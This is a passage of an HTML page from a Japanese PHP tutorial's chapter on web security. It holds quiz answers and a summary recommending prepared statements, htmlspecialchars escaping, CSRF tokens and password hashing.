                                        <summary class="cursor-pointer text-blue-600 hover:text-blue-700 break-words">
                                            回答を表示
                                        </summary>
                                        <p class="mt-2 pl-4 text-blue-800 bg-blue-100 rounded-lg p-3 break-words">
                                            <strong>プリペアドステートメント（prepared statement）</strong>を使用することです。
                                            プリペアドステートメントを使うと、SQL文とデータが明確に分離され、
                                            ユーザー入力が自動的にエスケープされるため、SQLインジェクションを防ぐことができます。
                                        </p>
                                    </details>
                                </li>
                                <li class="text-blue-900">
                                    <p class="font-medium mb-2 break-words">Q2. XSS攻撃を防ぐために、ユーザー入力を出力する際に使用すべきPHP関数は何ですか？</p>
                                    <details class="mt-2">
                                        <summary class="cursor-pointer text-blue-600 hover:text-blue-700 break-words">
                                            回答を表示
                                        </summary>
                                        <p class="mt-2 pl-4 text-blue-800 bg-blue-100 rounded-lg p-3 break-words">
                                            <strong>htmlspecialchars関数</strong>を使用します。
                                            <code>htmlspecialchars($input, ENT_QUOTES, 'UTF-8')</code>のように記述することで、
                                            HTML特殊文字がエスケープされ、スクリプトの実行を防ぐことができます。
                                        </p>
                                    </details>
                                </li>
                                <li class="text-blue-900">
                                    <p class="font-medium mb-2 break-words">Q3. CSRF攻撃を防ぐために実装する仕組みは何ですか？</p>
                                    <details class="mt-2">
                                        <summary class="cursor-pointer text-blue-600 hover:text-blue-700 break-words">
                                            回答を表示
                                        </summary>
                                        <p class="mt-2 pl-4 text-blue-800 bg-blue-100 rounded-lg p-3 break-words">
                                            <strong>CSRFトークン</strong>を使用します。
                                            フォーム表示時にランダムなトークンを生成してセッションに保存し、
                                            フォーム送信時にトークンが一致するかを検証することで、
                                            正規のフォームからのリクエストであることを確認できます。
                                        </p>
                                    </details>
                                </li>
                                <li class="text-blue-900">
                                    <p class="font-medium mb-2 break-words">Q4. パスワードをデータベースに保存する際、どのように処理すべきですか？</p>
                                    <details class="mt-2">
                                        <summary class="cursor-pointer text-blue-600 hover:text-blue-700 break-words">
                                            回答を表示
                                        </summary>
                                        <p class="mt-2 pl-4 text-blue-800 bg-blue-100 rounded-lg p-3 break-words">
                                            パスワードは<strong>必ずハッシュ化</strong>して保存します。
                                            PHPでは<code>password_hash($password, PASSWORD_DEFAULT)</code>を使用し、
                                            検証時には<code>password_verify($input, $hashed)</code>を使用します。
                                            平文（そのまま）での保存は絶対に行いません。
                                        </p>
                                    </details>
                                </li>
                            </ol>
                        </div>
                    </div>
                </div>

                <!-- 章のまとめ -->
                <div class="bg-gradient-to-r from-slate-50 to-gray-50 border border-slate-200 rounded-xl p-6 my-8">
                    <h2 class="text-xl font-semibold text-slate-800 mb-4 flex items-center gap-2">
                        <i class="fas fa-bookmark text-slate-600"></i>
                        第13章のまとめ
                    </h2>
                    <ul class="space-y-3">
                        <li class="flex items-start gap-3 text-slate-700">
                            <i class="fas fa-check-circle text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>Webアプリケーションのセキュリティは、サービスの信頼性を保つために<strong>最も重要</strong>な要素です。</span>
                        </li>
                        <li class="flex items-start gap-3 text-slate-700">
                            <i class="fas fa-check-circle text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span><strong>SQLインジェクション対策</strong>: プリペアドステートメントを使用し、ユーザー入力を直接SQL文に埋め込まない。</span>
                        </li>
                        <li class="flex items-start gap-3 text-slate-700">
                            <i class="fas fa-check-circle text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span><strong>XSS対策</strong>: htmlspecialchars関数でユーザー入力をエスケープし、悪意のあるスクリプトの実行を防ぐ。</span>
                        </li>
                        <li class="flex items-start gap-3 text-slate-700">
                            <i class="fas fa-check-circle text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span><strong>CSRF対策</strong>: CSRFトークンを使用して、正規のフォームからのリクエストであることを検証する。</span>
                        </li>
                        <li class="flex items-start gap-3 text-slate-700">
                            <i class="fas fa-check-circle text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span><strong>パスワード管理</strong>: password_hash関数でハッシュ化し、平文での保存は絶対に行わない。</span>
                        </li>
                        <li class="flex items-start gap-3 text-slate-700">
                            <i class="fas fa-check-circle text-emerald-500 mt-1 flex-shrink-0"></i>
                            <span>セキュリティは「後から追加する」ものではなく、<strong>設計段階から組み込む</strong>べきものです。</span>
                        </li>
                    </ul>
                </div>

                <!-- 章間ナビゲーション -->
                <nav class="flex items-center justify-between pt-6 mt-6 border-t border-slate-200">
                    <a href="php-learning-material-12.html"
                       class="group flex items-center gap-3 px-4 py-3 rounded-xl
                              bg-slate-100 hover:bg-slate-200 text-slate-700 transition-colors">
                        <i class="fas fa-arrow-left transition-transform group-hover:-translate-x-1"></i>
                        <div>
                            <span class="text-xs text-slate-500 block">前の章</span>
                            <span class="font-medium">第12章: オブジェクト指向プログラミング入門</span>
                        </div>
                    </a>
                    <a href="php-learning-material-14.html"
                       class="group flex items-center gap-3 px-4 py-3 rounded-xl
                              bg-primary-500 hover:bg-primary-600 text-white transition-colors">
                        <div class="text-right">
                            <span class="text-xs text-primary-100 block">次の章</span>
                            <span class="font-medium">第14章: 実践的なWebアプリケーション作成</span>
                        </div>
                        <i class="fas fa-arrow-right transition-transform group-hover:translate-x-1"></i>
                    </a>
                </nav>
            </div>
        </main>
    </div>

    <!-- フッター -->
    <footer class="bg-slate-800 text-slate-300">
        <div class="max-w-screen-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
            <div class="flex flex-col md:flex-row items-center justify-between gap-4">
                <p class="text-sm text-center md:text-left">
                    &copy; 2025 F-Circle. All rights reserved.<br>
                    本資料はAIツールを活用し、人間による編集・監修のもと作成されています。
                </p>
                <div class="flex items-center gap-4">
                    <a href="https://github.com/fcircle-biz" class="hover:text-white transition-colors">
                        <i class="fab fa-github text-xl"></i>
                    </a>
                </div>
            </div>
        </div>
    </footer>

    <!-- スクロールトップボタン -->
    <button id="scroll-top-btn"
            class="fixed bottom-6 right-6 w-12 h-12 bg-primary-500 text-white rounded-full
                   shadow-lg hover:bg-primary-600 transition-all duration-300
                   opacity-0 invisible translate-y-4"
            onclick="scrollToTop()">
        <i class="fas fa-arrow-up"></i>
    </button>

    <!-- サイドバー生成 -->
    <script src="sidebar-content.js"></script>

    <!-- 共通JavaScript -->
    <script src="main.js"></script>

    <!-- 描画ツール -->
    <script src="drawing-tool.js"></script>
</body>
</html>
